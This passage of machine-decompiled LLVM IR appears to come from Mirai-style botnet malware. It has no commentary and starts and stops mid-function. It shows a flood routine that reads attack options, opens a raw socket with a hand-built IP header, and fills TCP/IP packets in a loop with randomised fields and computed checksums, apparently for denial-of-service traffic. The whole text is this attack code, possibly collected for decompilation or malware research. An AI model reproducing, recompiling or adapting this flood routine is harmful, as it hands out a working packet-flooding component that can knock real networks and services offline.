  store i32 %v0_c444, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c454 = load i32, i32* @r5, align 4
  store i32 %v0_c454, i32* %r0.global-to-local, align 4
  %v5_c458 = inttoptr i32 %v0_c444 to i32*
  %v6_c458 = call i32 @attack_get_opt_int(i32 %v0_c454, i32* %v5_c458, i32 13, i32 0)
  %v0_c45c = load i32, i32* @r4, align 4
  store i32 %v0_c45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c46c = load i32, i32* @r5, align 4
  store i32 %v0_c46c, i32* %r0.global-to-local, align 4
  %v5_c470 = inttoptr i32 %v0_c45c to i32*
  %v6_c470 = call i32 @attack_get_opt_int(i32 %v0_c46c, i32* %v5_c470, i32 14, i32 1)
  %v0_c474 = load i32, i32* @r4, align 4
  store i32 %v0_c474, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c484 = load i32, i32* @r5, align 4
  store i32 %v0_c484, i32* %r0.global-to-local, align 4
  %v5_c488 = inttoptr i32 %v0_c474 to i32*
  %v6_c488 = call i32 @attack_get_opt_int(i32 %v0_c484, i32* %v5_c488, i32 15, i32 0)
  %v0_c490 = load i32, i32* @r4, align 4
  store i32 %v0_c490, i32* %r1.global-to-local, align 4
  %v2_c494 = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_c494, i32* %r3.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_c4a0 = load i32, i32* @r5, align 4
  store i32 %v0_c4a0, i32* %r0.global-to-local, align 4
  %v5_c4a4 = inttoptr i32 %v0_c490 to i32*
  %v6_c4a4 = call i32 @attack_get_opt_ip(i32 %v0_c4a0, i32* %v5_c4a4, i32 24, i32 %v2_c494, i32 %v6_c488)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @__GI_time(i32* null)
  %v1_c4b4 = load i32, i32* @r6, align 4
  %v2_c4b4 = add i32 %v1_c4b4, %v2_c4b0
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c4c8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c4c8, i32* %r0.global-to-local, align 4
  %v7_c4cc = icmp eq i32 %v3_c4c8, -1
  store i1 %v7_c4cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c4c8, i32* @r8, align 4
  br i1 %v7_c4cc, label %dec_label_pc_c9a0, label %dec_label_pc_c4d8

dec_label_pc_c4d8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c4e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c4e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c4f4 = call i32 @__GI_setsockopt(i32 %v3_c4c8, i32 0, i32 3, i32 %v6_c4e0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c4f4, i32* %r0.global-to-local, align 4
  %v7_c4f8 = icmp eq i32 %v5_c4f4, -1
  store i1 %v7_c4f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c4f8, label %dec_label_pc_c9ac, label %dec_label_pc_c500

dec_label_pc_c500:                                ; preds = %dec_label_pc_c4d8
  %v3_c50c = mul i32 %v7_c34c, 65536
  store i32 %v3_c50c, i32* %r0.global-to-local, align 4
  %v0_c514 = load i32, i32* %fp.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c410, i32* %r1.global-to-local, align 4
  %v3_c520 = urem i32 %v7_c34c, 65536
  store i32 %v3_c520, i32* %r2.global-to-local, align 4
  %v3_c524 = urem i32 %v6_c3a8, 65536
  store i32 %v3_c524, i32* %r3.global-to-local, align 4
  %v3_c528 = urem i32 %v0_c514, 65536
  %v0_c52c = load i32, i32* @sb, align 4
  %v2_c52c = icmp eq i32 %v0_c52c, 0
  store i1 %v2_c52c, i1* %cpsr_z.global-to-local, align 1
  %v1_c53c = urem i32 %v6_c410, 256
  store i32 %v1_c53c, i32* @fp, align 4
  br i1 %v2_c52c, label %dec_label_pc_c790.preheader, label %dec_label_pc_c544

dec_label_pc_c544:                                ; preds = %dec_label_pc_c500
  %trunc = trunc i32 %v7_c34c to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp60 = mul nuw nsw i32 %v3_c524, 256
  %v3_c570 = and i32 %tmp60, 65280
  %tmp61 = mul i32 %v0_c514, 256
  %v3_c574 = and i32 %tmp61, 65280
  %tmp62 = mul i32 %v5_c3e0, 256
  %v3_c578 = and i32 %tmp62, 65280
  %v1_c57c = urem i32 %v6_c410, 2
  %tmp63 = udiv i32 %v6_c3a8, 256
  %v4_c580 = urem i32 %tmp63, 256
  %v5_c580 = or i32 %v3_c570, %v4_c580
  %tmp64 = udiv i32 %v0_c514, 256
  %v4_c584 = urem i32 %tmp64, 256
  %v5_c584 = or i32 %v4_c584, %v3_c574
  store i32 %v5_c584, i32* @r5, align 4
  %tmp65 = udiv i32 %v5_c3e0, 256
  %v4_c588 = urem i32 %tmp65, 256
  %v5_c588 = or i32 %v4_c588, %v3_c578
  store i32 %v5_c588, i32* @lr, align 4
  %v1_c59c = urem i32 %v6_c428, 2
  store i32 %v1_c59c, i32* %r1.global-to-local, align 4
  %v1_c5a0 = urem i32 %v6_c440, 2
  store i32 %v1_c5a0, i32* %r2.global-to-local, align 4
  %v1_c5a4 = urem i32 %v6_c458, 2
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  %v1_c5a8 = urem i32 %v6_c470, 2
  store i32 %v1_c5a8, i32* @r6, align 4
  %v1_c5ac = urem i32 %v6_c488, 2
  store i32 %v1_c5ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_c628 = trunc i32 %v6_c364 to i8
  %sext6 = mul nuw i32 %v5_c580, 65536
  %v4_c654 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_c584, 65536
  %v6_c690 = sdiv i32 %sext7, 65536
  %tmp = sub nsw i32 0, %v1_c59c
  %v4_c6a8 = and i32 %tmp, 16
  %tmp66 = sub nsw i32 0, %v1_c5a0
  %v4_c6c0 = and i32 %tmp66, 8
  %tmp67 = sub nsw i32 0, %v1_c5a4
  %v4_c6d4 = and i32 %tmp67, 4
  %tmp68 = sub nsw i32 0, %v1_c5a8
  %v3_c6e8 = and i32 %tmp68, 2
  br label %dec_label_pc_c5d4

dec_label_pc_c5d4:                                ; preds = %.thread, %dec_label_pc_c544
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c5dc = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c5dc, i32* %r0.global-to-local, align 4
  %v3_c5e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c5e0, i32* %r2.global-to-local, align 4
  %v1_c5e4 = load i32, i32* @sl, align 4
  %v2_c5e4 = load i32, i32* @r4, align 4
  %v5_c5e4 = mul i32 %v2_c5e4, 4
  %v6_c5e4 = add i32 %v5_c5e4, %v1_c5e4
  %v7_c5e4 = inttoptr i32 %v6_c5e4 to i32*
  store i32 %v2_c5dc, i32* %v7_c5e4, align 4
  %v0_c5e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c5e8 = mul i32 %v0_c5e8, 32
  store i32 %v3_c5e8, i32* %r3.global-to-local, align 4
  %v0_c5ec = load i32, i32* @sl, align 4
  %v4_c5ec = mul i32 %v0_c5e8, 4
  %v5_c5ec = add i32 %v0_c5ec, %v4_c5ec
  %v6_c5ec = inttoptr i32 %v5_c5ec to i32*
  %v7_c5ec = load i32, i32* %v6_c5ec, align 4
  store i32 %v7_c5ec, i32* %r4.global-to-local, align 4
  %v5_c5f0 = mul i32 %v0_c5e8, 24
  store i32 %v5_c5f0, i32* %r3.global-to-local, align 4
  %v1_c5f4 = load i32, i32* @r7, align 4
  %v2_c5f4 = add i32 %v1_c5f4, %v5_c5f0
  store i32 %v2_c5f4, i32* %r0.global-to-local, align 4
  %v1_c5f8 = inttoptr i32 %v7_c5ec to i8*
  %v2_c5f8 = load i8, i8* %v1_c5f8, align 1
  %tmp69 = urem i8 %v2_c5f8, 16
  %v1_c5fc = zext i8 %tmp69 to i32
  %v1_c600 = or i32 %v1_c5fc, 64
  store i32 %v1_c600, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v1_c600 to i8
  store i8 %v1_c604, i8* %v1_c5f8, align 1
  %v0_c608 = load i32, i32* %r4.global-to-local, align 4
  %v1_c608 = inttoptr i32 %v0_c608 to i8*
  %v2_c608 = load i8, i8* %v1_c608, align 1
  %v1_c60c = and i8 %v2_c608, -16
  %v1_c610 = or i8 %v1_c60c, 5
  store i32 %v1_c390, i32* %r1.global-to-local, align 4
  store i8 %v1_c610, i8* %v1_c608, align 1
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 1
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v5_c348, i8* %v4_c620, align 1
  store i32 %v1_c36c, i32* %r3.global-to-local, align 4
  %v2_c628 = load i32, i32* %r4.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 8
  %v4_c628 = inttoptr i32 %v3_c628 to i8*
  store i8 %v1_c628, i8* %v4_c628, align 1
  %v0_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = icmp eq i32 %v0_c630, 0
  store i1 %v2_c630, i1* %cpsr_z.global-to-local, align 1
  %v2_c634 = load i32, i32* %r4.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 4
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %rev, i16* %v4_c634, align 2
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_c63c = load i32, i32* %r4.global-to-local, align 4
  %v3_c63c = add i32 %v2_c63c, 9
  %v4_c63c = inttoptr i32 %v3_c63c to i8*
  store i8 6, i8* %v4_c63c, align 1
  %v0_c640 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c640, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c5d4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c644 = load i32, i32* %r4.global-to-local, align 4
  %v4_c644 = add i32 %v3_c644, 6
  %v5_c644 = inttoptr i32 %v4_c644 to i16*
  store i16 64, i16* %v5_c644, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c5d4, %bb
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  %v1_c64c = load i32, i32* %r4.global-to-local, align 4
  %v2_c64c = add i32 %v1_c64c, 12
  %v3_c64c = inttoptr i32 %v2_c64c to i32*
  store i32 %v6_c4a4, i32* %v3_c64c, align 4
  %v0_c650 = load i32, i32* %r0.global-to-local, align 4
  %v1_c650 = add i32 %v0_c650, 16
  %v2_c650 = inttoptr i32 %v1_c650 to i32*
  %v3_c650 = load i32, i32* %v2_c650, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  store i32 %v4_c654, i32* %r0.global-to-local, align 4
  %v2_c65c = load i32, i32* %r4.global-to-local, align 4
  %v3_c65c = add i32 %v2_c65c, 2
  %v4_c65c = inttoptr i32 %v3_c65c to i16*
  store i16 15360, i16* %v4_c65c, align 2
  %v0_c660 = load i32, i32* %r3.global-to-local, align 4
  %v1_c660 = load i32, i32* %r4.global-to-local, align 4
  %v2_c660 = add i32 %v1_c660, 16
  %v3_c660 = inttoptr i32 %v2_c660 to i32*
  store i32 %v0_c660, i32* %v3_c660, align 4
  %v0_c664 = load i32, i32* %r0.global-to-local, align 4
  %v1_c664 = trunc i32 %v0_c664 to i16
  %v2_c664 = load i32, i32* %r4.global-to-local, align 4
  %v3_c664 = add i32 %v2_c664, 20
  %v4_c664 = inttoptr i32 %v3_c664 to i16*
  store i16 %v1_c664, i16* %v4_c664, align 2
  %v0_c668 = load i32, i32* %r4.global-to-local, align 4
  %v1_c668 = add i32 %v0_c668, 20
  store i32 %v1_c668, i32* %r1.global-to-local, align 4
  %v1_c66c = add i32 %v0_c668, 32
  %v2_c66c = inttoptr i32 %v1_c66c to i8*
  %v3_c66c = load i8, i8* %v2_c66c, align 1
  %v4_c66c = zext i8 %v3_c66c to i32
  store i32 %v4_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add i32 %v0_c668, 33
  %v2_c670 = inttoptr i32 %v1_c670 to i8*
  %v3_c670 = load i8, i8* %v2_c670, align 1
  %v4_c670 = zext i8 %v3_c670 to i32
  store i32 %v1_c57c, i32* %r0.global-to-local, align 4
  %v1_c678 = urem i8 %v3_c66c, 16
  %v1_c67c = or i8 %v1_c678, -96
  %v1_c680 = and i32 %v4_c670, 223
  store i32 %v1_c680, i32* %r2.global-to-local, align 4
  store i8 %v1_c67c, i8* %v2_c66c, align 1
  %v0_c688 = load i32, i32* %r2.global-to-local, align 4
  %v1_c688 = load i32, i32* %r0.global-to-local, align 4
  %v4_c688 = mul i32 %v1_c688, 32
  %v5_c688 = or i32 %v4_c688, %v0_c688
  store i32 %v5_c688, i32* %r2.global-to-local, align 4
  store i32 %v5_c588, i32* %r0.global-to-local, align 4
  store i32 %v6_c690, i32* %r3.global-to-local, align 4
  %v1_c694 = trunc i32 %v5_c688 to i8
  %v2_c694 = load i32, i32* %r1.global-to-local, align 4
  %v3_c694 = add i32 %v2_c694, 13
  %v4_c694 = inttoptr i32 %v3_c694 to i8*
  store i8 %v1_c694, i8* %v4_c694, align 1
  %v0_c698 = load i32, i32* %r3.global-to-local, align 4
  %v1_c698 = trunc i32 %v0_c698 to i16
  %v2_c698 = load i32, i32* %r1.global-to-local, align 4
  %v3_c698 = add i32 %v2_c698, 2
  %v4_c698 = inttoptr i32 %v3_c698 to i16*
  store i16 %v1_c698, i16* %v4_c698, align 2
  %v0_c69c = load i32, i32* %r1.global-to-local, align 4
  %v1_c69c = add i32 %v0_c69c, 13
  %v2_c69c = inttoptr i32 %v1_c69c to i8*
  %v3_c69c = load i8, i8* %v2_c69c, align 1
  %v4_c69c = zext i8 %v3_c69c to i32
  store i32 %v1_c59c, i32* %r2.global-to-local, align 4
  %v1_c6a4 = and i32 %v4_c69c, 239
  %v5_c6a8 = or i32 %v1_c6a4, %v4_c6a8
  store i32 %v5_c6a8, i32* %r3.global-to-local, align 4
  %v0_c6ac = load i32, i32* %r0.global-to-local, align 4
  %v2_c6ac = add i32 %v0_c69c, 4
  %v3_c6ac = inttoptr i32 %v2_c6ac to i32*
  store i32 %v0_c6ac, i32* %v3_c6ac, align 4
  %v0_c6b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c6b0 = trunc i32 %v0_c6b0 to i8
  %v2_c6b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c6b0 = add i32 %v2_c6b0, 13
  %v4_c6b0 = inttoptr i32 %v3_c6b0 to i8*
  store i8 %v1_c6b0, i8* %v4_c6b0, align 1
  %v0_c6b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6b4 = add i32 %v0_c6b4, 13
  %v2_c6b4 = inttoptr i32 %v1_c6b4 to i8*
  %v3_c6b4 = load i8, i8* %v2_c6b4, align 1
  %v4_c6b4 = zext i8 %v3_c6b4 to i32
  store i32 %v1_c5a0, i32* %r3.global-to-local, align 4
  %v1_c6bc = and i32 %v4_c6b4, 247
  %v5_c6c0 = or i32 %v1_c6bc, %v4_c6c0
  store i32 %v5_c6c0, i32* %r2.global-to-local, align 4
  %v1_c6c4 = trunc i32 %v5_c6c0 to i8
  store i8 %v1_c6c4, i8* %v2_c6b4, align 1
  %v0_c6c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6c8 = add i32 %v0_c6c8, 13
  %v2_c6c8 = inttoptr i32 %v1_c6c8 to i8*
  %v3_c6c8 = load i8, i8* %v2_c6c8, align 1
  %v4_c6c8 = zext i8 %v3_c6c8 to i32
  store i32 %v1_c5a4, i32* %r0.global-to-local, align 4
  %v1_c6d0 = and i32 %v4_c6c8, 251
  %v5_c6d4 = or i32 %v1_c6d0, %v4_c6d4
  store i32 %v5_c6d4, i32* %r3.global-to-local, align 4
  %v1_c6d8 = trunc i32 %v5_c6d4 to i8
  store i8 %v1_c6d8, i8* %v2_c6c8, align 1
  %v0_c6dc = load i32, i32* %r1.global-to-local, align 4
  %v1_c6dc = add i32 %v0_c6dc, 13
  %v2_c6dc = inttoptr i32 %v1_c6dc to i8*
  %v3_c6dc = load i8, i8* %v2_c6dc, align 1
  %v4_c6dc = zext i8 %v3_c6dc to i32
  store i32 %v1_c5a8, i32* %r3.global-to-local, align 4
  %v1_c6e4 = and i32 %v4_c6dc, 253
  %v4_c6e8 = or i32 %v1_c6e4, %v3_c6e8
  store i32 %v4_c6e8, i32* %r2.global-to-local, align 4
  %v1_c6ec = trunc i32 %v4_c6e8 to i8
  store i8 %v1_c6ec, i8* %v2_c6dc, align 1
  %v0_c6f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6f0 = add i32 %v0_c6f0, 13
  %v2_c6f0 = inttoptr i32 %v1_c6f0 to i8*
  %v3_c6f0 = load i8, i8* %v2_c6f0, align 1
  %v4_c6f0 = zext i8 %v3_c6f0 to i32
  store i32 %v1_c5ac, i32* %r0.global-to-local, align 4
  %v1_c6f8 = and i32 %v4_c6f0, 254
  %v2_c6fc = or i32 %v1_c6f8, %v1_c5ac
  store i32 %v2_c6fc, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 4, i32* @r6, align 4
  %v1_c708 = trunc i32 %v2_c6fc to i8
  store i8 %v1_c708, i8* %v2_c6f0, align 1
  %v0_c70c = load i32, i32* @r5, align 4
  %v1_c70c = trunc i32 %v0_c70c to i8
  %v2_c70c = load i32, i32* %r4.global-to-local, align 4
  %v3_c70c = add i32 %v2_c70c, 40
  %v4_c70c = inttoptr i32 %v3_c70c to i8*
  store i8 %v1_c70c, i8* %v4_c70c, align 1
  %v0_c710 = load i32, i32* @r6, align 4
  %v1_c710 = trunc i32 %v0_c710 to i8
  %v2_c710 = load i32, i32* %r4.global-to-local, align 4
  %v3_c710 = add i32 %v2_c710, 41
  %v4_c710 = inttoptr i32 %v3_c710 to i8*
  store i8 %v1_c710, i8* %v4_c710, align 1
  %v0_c714 = call i32 @rand_next()
  %v1_c718 = urem i32 %v0_c714, 16
  %v1_c71c = or i32 %v1_c718, 1392
  %v1_c720 = add nuw nsw i32 %v1_c71c, 8
  %v3_c724 = mul nuw nsw i32 %v1_c720, 65536
  store i32 %v3_c724, i32* %r0.global-to-local, align 4
  %v3_c728 = mul nuw nsw i32 %v1_c720, 256
  %v5_c730 = or i32 %v3_c728, 5
  %v1_c734 = trunc i32 %v5_c730 to i16
  %v2_c734 = load i32, i32* %r4.global-to-local, align 4
  %v3_c734 = add i32 %v2_c734, 42
  %v4_c734 = inttoptr i32 %v3_c734 to i16*
  store i16 %v1_c734, i16* %v4_c734, align 2
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_c740 = load i32, i32* %r4.global-to-local, align 4
  %v3_c740 = add i32 %v2_c740, 46
  %v4_c740 = inttoptr i32 %v3_c740 to i8*
  store i8 8, i8* %v4_c740, align 1
  %v0_c744 = load i32, i32* %r2.global-to-local, align 4
  %v1_c744 = trunc i32 %v0_c744 to i8
  %v2_c744 = load i32, i32* %r4.global-to-local, align 4
  %v3_c744 = add i32 %v2_c744, 47
  %v4_c744 = inttoptr i32 %v3_c744 to i8*
  store i8 %v1_c744, i8* %v4_c744, align 1
  %v0_c748 = load i32, i32* @r6, align 4
  %v1_c748 = trunc i32 %v0_c748 to i8
  %v2_c748 = load i32, i32* %r4.global-to-local, align 4
  %v3_c748 = add i32 %v2_c748, 44
  %v4_c748 = inttoptr i32 %v3_c748 to i8*
  store i8 %v1_c748, i8* %v4_c748, align 1
  %v0_c74c = load i32, i32* @r5, align 4
  %v1_c74c = trunc i32 %v0_c74c to i8
  %v2_c74c = load i32, i32* %r4.global-to-local, align 4
  %v3_c74c = add i32 %v2_c74c, 45
  %v4_c74c = inttoptr i32 %v3_c74c to i8*
  store i8 %v1_c74c, i8* %v4_c74c, align 1
  %v0_c750 = call i32 @rand_next()
  store i32 %v0_c750, i32* %r0.global-to-local, align 4
  %v2_c758 = load i32, i32* %r4.global-to-local, align 4
  %v3_c758 = add i32 %v2_c758, 59
  %v4_c758 = inttoptr i32 %v3_c758 to i8*
  store i8 6, i8* %v4_c758, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c768 = load i32, i32* %r4.global-to-local, align 4
  %v2_c768 = add i32 %v1_c768, 48
  %v3_c768 = inttoptr i32 %v2_c768 to i32*
  store i32 %v0_c750, i32* %v3_c768, align 4
  %v0_c76c = load i32, i32* %r3.global-to-local, align 4
  %v1_c76c = load i32, i32* %r4.global-to-local, align 4
  %v2_c76c = add i32 %v1_c76c, 52
  %v3_c76c = inttoptr i32 %v2_c76c to i32*
  store i32 %v0_c76c, i32* %v3_c76c, align 4
  %v0_c770 = load i32, i32* %r2.global-to-local, align 4
  %v1_c770 = trunc i32 %v0_c770 to i8
  %v2_c770 = load i32, i32* %r4.global-to-local, align 4
  %v3_c770 = add i32 %v2_c770, 56
  %v4_c770 = inttoptr i32 %v3_c770 to i8*
  store i8 %v1_c770, i8* %v4_c770, align 1
  %v0_c774 = load i32, i32* %r1.global-to-local, align 4
  %v1_c774 = trunc i32 %v0_c774 to i8
  %v2_c774 = load i32, i32* %r4.global-to-local, align 4
  %v3_c774 = add i32 %v2_c774, 58
  %v4_c774 = inttoptr i32 %v3_c774 to i8*
  store i8 %v1_c774, i8* %v4_c774, align 1
  %v0_c778 = load i32, i32* %r1.global-to-local, align 4
  %v1_c778 = trunc i32 %v0_c778 to i8
  %v2_c778 = load i32, i32* %r4.global-to-local, align 4
  %v3_c778 = add i32 %v2_c778, 57
  %v4_c778 = inttoptr i32 %v3_c778 to i8*
  store i8 %v1_c778, i8* %v4_c778, align 1
  %v3_c77c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c77c, i32* %r3.global-to-local, align 4
  %v1_c780 = load i32, i32* %r2.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, %v3_c77c
  store i32 %v2_c780, i32* @r4, align 4
  %v1_c784 = load i32, i32* @sb, align 4
  %v9_c784 = icmp eq i32 %v2_c780, %v1_c784
  store i1 %v9_c784, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c780, i32* %stack_var_-44, align 4
  %v5_c78c = icmp slt i32 %v2_c780, %v1_c784
  br i1 %v5_c78c, label %dec_label_pc_c5d4, label %dec_label_pc_c790.preheader

dec_label_pc_c790.preheader:                      ; preds = %.thread, %dec_label_pc_c500
  %v0_c79410 = phi i32 [ 0, %dec_label_pc_c500 ], [ %v1_c784, %.thread ]
  %v2_c7ac = icmp eq i32 %v6_c4a4, -1
  %v7_c7ac = icmp eq i32 %v6_c4a4, -1
  %v9_c7c0 = icmp eq i32 %v3_c520, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  br label %dec_label_pc_c790

dec_label_pc_c790:                                ; preds = %dec_label_pc_c98c.dec_label_pc_c790_crit_edge, %dec_label_pc_c790.preheader
  %v0_c794 = phi i32 [ %v0_c794.pre, %dec_label_pc_c98c.dec_label_pc_c790_crit_edge ], [ %v0_c79410, %dec_label_pc_c790.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c794 = icmp eq i32 %v0_c794, 0
  store i1 %v2_c794, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c794, label %dec_label_pc_c98c, label %dec_label_pc_c7a0

dec_label_pc_c7a0:                                ; preds = %dec_label_pc_c790
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c884

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c884
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  store i1 %v7_c7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c7ac, label %dec_label_pc_c904, label %dec_label_pc_c7b4

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c7a8
  store i32 %v3_c520, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_c7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7c0, label %dec_label_pc_c920, label %dec_label_pc_c7c8

dec_label_pc_c7c8:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c7b4
  %v1_c7cc = phi i32 [ %v1_c914, %dec_label_pc_c904 ], [ add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), %dec_label_pc_c7b4 ]
  store i32 %v3_c524, i32* %r1.global-to-local, align 4
  %v9_c7cc = icmp eq i32 %v3_c524, %v1_c7cc
  store i1 %v9_c7cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7cc, label %dec_label_pc_c934, label %dec_label_pc_c7d4

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge, %dec_label_pc_c7c8
  %v1_c7d8 = phi i32 [ %v1_c7d8.pre, %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge ], [ %v1_c7cc, %dec_label_pc_c7c8 ]
  store i32 %v3_c528, i32* %r2.global-to-local, align 4
  %v9_c7d8 = icmp eq i32 %v3_c528, %v1_c7d8
  store i1 %v9_c7d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7d8, label %dec_label_pc_c948, label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge, %dec_label_pc_c7d4
  %v1_c7e4 = phi i32 [ %v1_c7e4.pre, %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge ], [ %v1_c7d8, %dec_label_pc_c7d4 ]
  store i32 %v5_c3e0, i32* %r3.global-to-local, align 4
  %v9_c7e4 = icmp eq i32 %v5_c3e0, %v1_c7e4
  store i1 %v9_c7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7e4, label %dec_label_pc_c95c, label %dec_label_pc_c7ec

dec_label_pc_c7ec:                                ; preds = %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge, %dec_label_pc_c7e0
  %v1_c7f0 = phi i32 [ %v1_c7f0.pre, %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge ], [ %v1_c7e4, %dec_label_pc_c7e0 ]
  store i32 %v6_c3f8, i32* %r0.global-to-local, align 4
  %v9_c7f0 = icmp eq i32 %v6_c3f8, %v1_c7f0
  store i1 %v9_c7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7f0, label %dec_label_pc_c970, label %dec_label_pc_c7f8

dec_label_pc_c7f8:                                ; preds = %dec_label_pc_c95c, %dec_label_pc_c7ec
  %v0_c7f8 = load i32, i32* @fp, align 4
  %v2_c7f8 = icmp eq i32 %v0_c7f8, 0
  store i1 %v2_c7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c7f8, label %dec_label_pc_c800, label %dec_label_pc_c980

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7f8, %dec_label_pc_c970, %dec_label_pc_c980
  %v2_c804 = load i32, i32* @r5, align 4
  %v3_c804 = add i32 %v2_c804, 10
  %v4_c804 = inttoptr i32 %v3_c804 to i16*
  store i16 0, i16* %v4_c804, align 2
  %v0_c808 = load i32, i32* @r5, align 4
  store i32 %v0_c808, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c810 = call i32 @checksum_generic(i32 %v0_c808, i32 20)
  %v3_c810 = trunc i32 %v2_c810 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c818 = load i32, i32* @r5, align 4
  %v4_c818 = add i32 %v3_c818, 10
  %v5_c818 = inttoptr i32 %v4_c818 to i16*
  store i16 %v3_c810, i16* %v5_c818, align 2
  %v0_c81c = load i32, i32* @r6, align 4
  store i32 %v0_c81c, i32* @r1, align 4
  %v0_c820 = load i32, i32* %r2.global-to-local, align 4
  %v1_c820 = trunc i32 %v0_c820 to i16
  %v3_c820 = add i32 %v0_c81c, 16
  %v4_c820 = inttoptr i32 %v3_c820 to i16*
  store i16 %v1_c820, i16* %v4_c820, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c82c = load i32, i32* @r5, align 4
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  %v4_c830 = call i32 @checksum_tcpudp(i32 %v0_c82c, i32 %v0_c81c, i32 10240, i32 40)
  %v5_c830 = trunc i32 %v4_c830 to i16
  store i32 %v4_c830, i32* %r0.global-to-local, align 4
  %v3_c834 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c834, i32* %r3.global-to-local, align 4
  %v3_c838 = mul i32 %v3_c834, 32
  store i32 %v3_c838, i32* %lr.global-to-local, align 4
  %v3_c83c = load i32, i32* @r6, align 4
  %v4_c83c = add i32 %v3_c83c, 16
  %v5_c83c = inttoptr i32 %v4_c83c to i16*
  store i16 %v5_c830, i16* %v5_c83c, align 2
  %v0_c840 = load i32, i32* %lr.global-to-local, align 4
